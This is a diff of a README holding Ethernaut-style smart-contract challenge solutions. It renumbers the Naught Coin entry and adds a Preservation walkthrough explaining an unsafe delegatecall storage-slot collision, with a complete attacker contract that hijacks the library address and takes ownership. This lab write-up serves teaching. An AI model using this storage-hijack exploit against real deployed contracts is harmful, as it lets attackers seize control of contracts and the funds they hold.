@@ -17,7 +17,8 @@
 10. [Re-entrancy](#10---re-entrancy)
 11. [Elevator](#11---elevator)
 12. [Privacy](#12---privacy)
-13. [Naught Coin](#13---naught-coin)
+15. [Naught Coin](#15---naught-coin)
+16. [Preservation](#16---preservation)
     
 ## 01 - Fallback
 
@@ -331,7 +332,7 @@ We got our key, we just need to call the `unlock` function and the challenge is 
 
 [Test script](./test/Privacy.test.js)
 
-## 13 - Naught Coin
+## 15 - Naught Coin
 > Due to compatibility errors that occurred because the challenge contract and ERC20 contracts use different breakpoint solidity versions, I downgraded the challenge Contract to 0.6.0. This downgrade doesn't affect the solution, it is only to passe the compilation error.
 
 There are no tricks or backdoors to pass this challenge, we only need to understand the ERC20 available methods.<br>
@@ -366,3 +367,80 @@ tx = await naughtCoin.connect(account1).transferFrom(
 For more details concerning the `approve` and `transferFrom` functions, [read the ERC20 openzeppelin implementation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-)
 
 [Test script](./test/NaughtCoin.test.js)
+
+## 16 - Preservation
+
+To pass this challenge, we need to claim ownership of the contract. After carefully reading the contract code, we notice using **unsafe delegatecall**.<br />
+We can exploit the contract as following:
+1. Update the delegatecall target(timeZone1Library) address to our own `PreservationAttack`'s address.
+2. Re-call the `setFirstTime` of the `Preservation` contract, **and this time, it will delegatecall our own `PreservationAttack`**
+3. Create the `setTime` function with the same signature and update the owner.
+
+To update the delegatecall target and the owner states, we need to pay attention to the storage layout of both contracts.
+
+`Preservation` contract:
+```solidity
+address public timeZone1Library;
+address public timeZone2Library;
+address public owner; 
+uint storedTime;
+```
+`LibraryContract` contract:
+```solidity
+uint storedTime; 
+```
+The `Preservation` contract calls an external library in a **Delegatecall**:
+```solidity
+function setFirstTime(uint _timeStamp) public {
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+}
+```
+the `setTimeSignature` is given: ` bytes4(keccak256("setTime(uint256)"));`
+So the `Preservation` contract delegatescall the `setTime` function in `Library contract`, the function code is:
+```solidity
+function setTime(uint _time) public {
+   storedTime = _time;
+}
+
+```
+So, after the `Preservation` contract `delegatecall` the LibraryContract, **the `setTime` function will be exectued in the context of the Preservation contract**. The `LibraryContract` updates the `storedTime` state which is declared first.(**slot0**) inside the contract. So the first state declared in **slot0** in `Preservation` contract will be updated, Hence, the **timeZone1Library**.
+The `attack` function in our `PreservaionAttack` contract:
+```solidity
+function attack() external {
+   preservation.setFirstTime(uint256(uint160(address(this))));
+   preservation.setFirstTime(2);
+}
+```
+> Note that we cast the address of the contract to uint because the setTime function requires a uint parameter
+
+So, further delegatescall: `timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));` will refer to our `PreservationAttack` contract.<br />
+To update the owner, we simply need to create the same storage of `Preservation` in our `PreservationAttack` via declaring states **with the same name, and in the same order**. And then create the `setTime` function **with the same signature** that updates the owner state:
+```solidity
+contract PreservationAttack {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner; 
+    uint storedTime;
+
+    Preservation public preservation;
+
+    constructor(Preservation _address) {
+        preservation = Preservation(_address);
+    }
+
+    function attack() external {
+        preservation.setFirstTime(uint256(uint160(address(this))));
+        preservation.setFirstTime(2);
+    }
+
+    function setTime(uint _time) public {
+        owner = tx.origin;
+    }
+
+}
+```
+To make a long story short, we only need to call the `attack` function in our `PreservationAttack`, and the ownership will be claimed.
+[Attack Contract](./contracts/Preservation.sol) | [Test script](./test/Preservation.test.js)
+
+
+
